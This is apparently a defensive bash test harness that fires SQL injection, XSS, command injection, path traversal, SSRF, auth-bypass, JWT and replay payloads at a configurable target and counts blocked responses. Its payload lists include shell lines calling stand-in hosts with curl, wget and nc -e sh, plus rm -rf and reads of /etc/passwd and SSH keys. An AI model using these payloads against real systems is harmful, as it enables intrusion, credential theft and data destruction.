#!/bin/bash
RED='\033[0;31m'; GRN='\033[0;32m'; NC='\033[0m'; BOLD='\033[1m'
TARGET="${TARGET:-http://localhost:8080}"
TOTAL=0; PASSED=0; FAILED=0

check() {
    local name="$1" code="$2"
    TOTAL=$((TOTAL + 1))
    case "$code" in
        400|401|403|404|405|414|429)
            PASSED=$((PASSED + 1))
            printf "  ${GRN}PASS${NC} [%3d] %-50s HTTP %s\n" "$TOTAL" "$name" "$code" ;;
        000)
            FAILED=$((FAILED + 1))
            printf "  ${RED}DEAD${NC} [%3d] %-50s (down)\n" "$TOTAL" "$name" ;;
        *)
            FAILED=$((FAILED + 1))
            printf "  ${RED}FAIL${NC} [%3d] %-50s HTTP %s\n" "$TOTAL" "$name" "$code" ;;
    esac
}

hit() {
    local path="$1"; shift
    curl -s -o /dev/null -w "%{http_code}" -m 5 "$@" "$TARGET$path" 2>/dev/null || echo 000
}

echo "════════════════════════════════════════════════════════"
echo "  HORIZON — ATTACK SIMULATION"
echo "  Target: $TARGET"
echo "  $(date '+%Y-%m-%d %H:%M:%S')"
echo "════════════════════════════════════════════════════════"

echo ""
echo "[1/12] SQL Injection"
SQLI=("' OR '1'='1" "' OR 1=1--" "'; DROP TABLE--" "admin'--" "1' UNION SELECT--" "1' AND SLEEP(5)--" "' OR 'x'='x" "1' OR 1=1#" "1' ORDER BY 100--" "1' GROUP BY 1--" "' OR EXISTS(SELECT)--" "' AND '1'='1" "'; UPDATE users--" "1' HAVING 1=1--" "' OR 1=1--" "1') OR (1=1--" "') OR ('1'='1" "' OR id IS NOT NULL--" "1'; INSERT INTO--" "' OR username LIKE '%" "' OR 1=1 LIMIT 1--" "1' AND 1=1--" "1' AND 1=2--" "' OR 'a'='a" "1' UNION ALL SELECT--")
for p in "${SQLI[@]}"; do
    enc=$(printf %s "$p" | od -An -tx1 | tr -d ' \n' | sed 's/../%&/g')
    check "SQLi: $(echo $p | head -c 35)" "$(hit "/api/reading?site_id=$enc")"
done

echo ""
echo "[2/12] XSS"
XSS=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg onload=alert(1)>" "javascript:alert(1)" "<iframe src=js:alert(1)>" "<body onload=alert(1)>" "<input onfocus=alert(1)>" "<details open ontoggle=alert(1)>" "<marquee onstart=alert(1)>" "<video onerror=alert(1)>" "'-alert(1)-'" "><script>alert(1)</script>" "<script>cookie</script>" "<img onerror=eval(1)>" "<<script>alert(1)//<</script>" "<scr<script>ipt>alert(1)</script>" "<svg/onload=alert(1)>" "<math><script>alert(1)</script></math>" "javascript&#58;alert(1)" "<a href=javascript:alert(1)>x</a>")
for p in "${XSS[@]}"; do
    enc=$(printf %s "$p" | od -An -tx1 | tr -d ' \n' | sed 's/../%&/g')
    check "XSS: $(echo $p | head -c 35)" "$(hit "/api/reading?site_id=$enc")"
done

echo ""
echo "[3/12] Command Injection"
CMDI=("; ls -la" "| cat /etc/passwd" "whoami_test" "id_test" "&& rm -rf /tmp" "; curl evil.com" "| nc -e sh" "; shutdown" "ping_test" "; wget evil" "| bash -i" "&& echo pwned" "; nc attacker" "cat_shadow" "|| sleep 10" "& bg_job" "; python -c id" "; perl system" "nslookup_evil" "; rm -rf /")
for p in "${CMDI[@]}"; do
    enc=$(printf %s "$p" | od -An -tx1 | tr -d ' \n' | sed 's/../%&/g')
    check "CMDi: $(echo $p | head -c 35)" "$(hit "/api/reading?site_id=$enc")"
done

echo ""
echo "[4/12] Path Traversal"
PATHT=("../../../etc/passwd" "..%2F..%2Fetc/passwd" "....//etc/passwd" "/etc/passwd" "C:\\Windows\\SAM" "..\\..\\boot.ini" "%2e%2e%2fetc" "..%252f..%252fetc" "/proc/self/environ" "/var/log/auth.log" "/root/.ssh/id_rsa" "..;/..;/etc/passwd" "/.git/config" "/.env" "/backup.sql" "/db.sqlite" "%c0%ae%c0%ae/" "file:///etc/passwd" "/WEB-INF/web.xml" "/etc/shadow")
for p in "${PATHT[@]}"; do
    enc=$(printf %s "$p" | od -An -tx1 | tr -d ' \n' | sed 's/../%&/g')
    check "PathT: $(echo $p | head -c 35)" "$(hit "/api/file?path=$enc")"
done

echo ""
echo "[5/12] SSRF"
SSRF=("http://169.254.169.254/meta" "http://metadata.google.internal" "http://localhost:22" "http://127.0.0.1:6379" "file:///etc/passwd" "gopher://localhost:6379" "http://[::1]:80" "http://0.0.0.0" "http://internal.local" "dict://localhost:11211" "http://2130706433/" "http://0177.0.0.1/" "http://127.1/" "http://[::ffff:127.0.0.1]/" "http://169.254.169.254/v1/")
for p in "${SSRF[@]}"; do
    enc=$(printf %s "$p" | od -An -tx1 | tr -d ' \n' | sed 's/../%&/g')
    check "SSRF: $(echo $p | head -c 40)" "$(hit "/api/proxy?url=$enc")"
done

echo ""
echo "[6/12] Auth Bypass"
for p in "/admin/stats" "/admin/users" "/admin/keys" "/admin/config" "/admin/logs" "/api/admin" "/api/keys" "/api/internal" "/api/users" "/api/export" "/internal/debug" "/debug/pprof" "/metrics" "/health/detailed" "/version" "/.env" "/config.json" "/backup.zip" "/admin/db" "/admin/backup" "/system/info" "/api/v1/admin" "/api/tenant" "/api/chain" "/api/ledger"; do
    check "Auth: $p" "$(hit "$p")"
done

echo ""
echo "[7/12] JWT"
check "JWT alg=none" "$(hit /admin/stats -H "Authorization: Bearer eyJhbGciOiJub25lIn0.e30.")"
check "JWT weak" "$(hit /admin/stats -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.e30.x")"
check "Empty bearer" "$(hit /admin/stats -H "Authorization: Bearer ")"
check "Bearer null" "$(hit /admin/stats -H "Authorization: Bearer null")"
check "Bearer 0" "$(hit /admin/stats -H "Authorization: Bearer 0")"
check "Bearer admin" "$(hit /admin/stats -H "Authorization: Bearer admin")"
check "No auth" "$(hit /admin/stats)"
check "Basic auth" "$(hit /admin/stats -H "Authorization: Basic YWRtaW46YWRtaW4=")"
check "Cookie auth" "$(hit /admin/stats -H "Cookie: session=admin")"
check "Bearer star" "$(hit /admin/stats -H "Authorization: Bearer *")"

echo ""
echo "[8/12] Header Injection"
check "X-Forwarded-For" "$(hit /admin/stats -H "X-Forwarded-For: 127.0.0.1")"
check "X-Real-IP" "$(hit /admin/stats -H "X-Real-IP: 127.0.0.1")"
check "X-Original-URL" "$(hit / -H "X-Original-URL: /admin/stats")"
check "X-Rewrite-URL" "$(hit / -H "X-Rewrite-URL: /admin/stats")"
check "X-Method-Override" "$(hit /admin/stats -H "X-HTTP-Method-Override: POST")"
check "X-Custom-IP" "$(hit /admin/stats -H "X-Custom-IP-Authorization: 127.0.0.1")"
check "X-Remote-Addr" "$(hit /admin/stats -H "X-Remote-Addr: 127.0.0.1")"
check "X-Client-IP" "$(hit /admin/stats -H "X-Client-IP: 127.0.0.1")"
check "Host evil" "$(hit / -H "Host: evil.com")"
check "Host internal" "$(hit / -H "Host: internal.admin")"
check "CRLF URL" "$(hit "/api/%0d%0aX-Inj:%20yes")"
check "CRLF param" "$(hit "/api/reading?site_id=x%0d%0aSet-Cookie:admin=1")"
check "Encoded newline" "$(hit "/api/%0a%0d/admin")"
check "Header cont" "$(hit /admin/stats -H "X-Test: v")"
check "X-HTTP-Method" "$(hit /admin/stats -H "X-HTTP-Method: DELETE")"

echo ""
echo "[9/12] Null Byte / Unicode"
for p in "test%00.txt" "test%00..%2fetc%2fpasswd" "..%00/passwd" "test%00.php" "%c0%ae%c0%ae/" "%e0%80%ae%e0%80%ae/" "%u0000" "%00admin" "admin%00" "%c0%80" "%e0%80%80" "%f0%80%80%80" "%00%00" "%fe%fe%ff%ff" "%2e%2e%00/"; do
    check "Null: $p" "$(hit "/api/reading?site_id=$p")"
done

echo ""
echo "[10/12] HTTP Methods"
check "TRACE" "$(hit / -X TRACE)"
check "TRACK" "$(hit / -X TRACK)"
check "PUT" "$(hit /admin/stats -X PUT)"
check "DELETE" "$(hit /admin/stats -X DELETE)"
check "PATCH" "$(hit /admin/stats -X PATCH)"
check "CONNECT" "$(hit / -X CONNECT)"
check "PROPFIND" "$(hit / -X PROPFIND)"
check "DEBUG" "$(hit / -X DEBUG)"
check "FOOBAR" "$(hit / -X FOOBAR)"
check "OPTIONS" "$(hit /admin/stats -X OPTIONS)"
check "HTTP/1.0" "$(curl -s -o /dev/null -w "%{http_code}" --http1.0 -m 5 "$TARGET/admin/stats" 2>/dev/null || echo 000)"
check "Encoded slash" "$(hit '/admin%2fstats')"
check "Double slash" "$(hit '//admin/stats')"
check "Trailing dot" "$(hit '/admin/stats.')"
check "Case bypass" "$(hit '/ADMIN/STATS')"

echo ""
echo "[11/12] Replay / Signature"
check "No sig" "$(hit /api/reading -X POST -H "Content-Type: application/json" -d '{"sensor_id":"x","value":42}')"
check "Empty sig" "$(hit /api/reading -X POST -H "Content-Type: application/json" -d '{"sensor_id":"x","value":42,"signature":""}')"
check "Fake sig" "$(hit /api/reading -X POST -H "Content-Type: application/json" -d '{"sensor_id":"x","value":42,"signature":"deadbeef"}')"
check "Old ts" "$(hit /api/reading -X POST -H "Content-Type: application/json" -d '{"sensor_id":"x","value":42,"timestamp":1000000,"signature":"x"}')"
check "Future ts" "$(hit /api/reading -X POST -H "Content-Type: application/json" -d '{"sensor_id":"x","value":42,"timestamp":9999999999,"signature":"x"}')"
check "Zero ts" "$(hit /api/reading -X POST -H "Content-Type: application/json" -d '{"sensor_id":"x","value":42,"timestamp":0,"signature":"x"}')"
check "Empty nonce" "$(hit /api/reading -X POST -H "Content-Type: application/json" -d '{"sensor_id":"x","value":42,"nonce":"","signature":"x"}')"
check "Empty batch" "$(hit /api/reading/batch -X POST -H "Content-Type: application/json" -d '{"readings":[]}')"
check "Empty sensor" "$(hit /api/reading -X POST -H "Content-Type: application/json" -d '{"sensor_id":"","value":42}')"
check "Non-numeric" "$(hit /api/reading -X POST -H "Content-Type: application/json" -d '{"sensor_id":"x","value":"abc"}')"
check "Malformed JSON" "$(hit /api/reading -X POST -H "Content-Type: application/json" -d '{"sensor_id":"x"')"
check "Wrong type" "$(hit /api/reading -X POST -H "Content-Type: application/json" -d '{"sensor_id":123,"value":42}')"
check "Wrong CT" "$(hit /api/reading -X POST -H "Content-Type: text/plain" -d 'hello')"
check "Replay body" "$(hit /api/reading -X POST -H "Content-Type: application/json" -H "X-Nonce: fixed" -d '{"sensor_id":"x","value":42}')"
check "Negative value" "$(hit /api/reading -X POST -H "Content-Type: application/json" -d '{"sensor_id":"x","value":-99999}')"

echo ""
echo "[12/12] Large Payload"
check "1MB body" "$(curl -s -o /dev/null -w "%{http_code}" -m 10 -X POST -H "Content-Type: application/json" --data-binary @<(head -c 1000000 /dev/zero | tr '\0' 'A') "$TARGET/api/reading" 2>/dev/null || echo 000)"
check "Deep JSON" "$(hit /api/reading -X POST -H "Content-Type: application/json" -d '[[[[[[[[[[1]]]]]]]]]]')"
check "Chunked smug" "$(hit / -H "Transfer-Encoding: chunked" -H "Content-Length: 100")"

echo ""
echo "════════════════════════════════════════════════════════"
echo "  SUMMARY"
echo "════════════════════════════════════════════════════════"
echo ""
printf "  Total:   %d\n" "$TOTAL"
printf "  ${GRN}Blocked: %d${NC}\n" "$PASSED"
printf "  ${RED}Failed:  %d${NC}\n" "$FAILED"
[ "$TOTAL" -gt 0 ] && printf "  Block rate: %d%%\n" $((PASSED * 100 / TOTAL))
echo ""
[ "$FAILED" -eq 0 ] && echo "  ${GRN}ALL BLOCKED${NC}" || echo "  ${RED}$FAILED not blocked${NC}"
echo ""
